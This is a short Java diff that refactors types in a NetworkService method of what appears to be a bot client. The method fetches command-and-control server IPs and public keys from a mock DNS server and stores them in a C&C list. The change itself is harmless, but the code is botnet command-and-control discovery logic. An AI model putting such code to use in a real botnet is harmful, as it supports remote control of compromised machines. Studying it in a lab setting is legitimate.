@@ -219,11 +219,11 @@ public class NetworkService {
 	 */
 	public boolean firstConnectToMockServerDns() {
 		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
-		Pairs<IP, String> result = new Pairs<IP, String>();
-		Pairs<IP, PublicKey> cec = new Pairs<IP, PublicKey>();
+		Pairs<String, String> result = new Pairs<>();
+		Pairs<IP, PublicKey> cec = new Pairs<>();
 		try {
 			result = botReq.getIpCeCFromDnsServer(url);
-			cec.setValue1(result.getValue1());
+			cec.setValue1(new IP(result.getValue1()));
 			cec.setValue2(pki.rebuildPuK(result.getValue2()));
 			commandConquerIps.add(cec);
 			commandConquerIps.getList().forEach(ip -> System.out.println(ip.getValue1()));
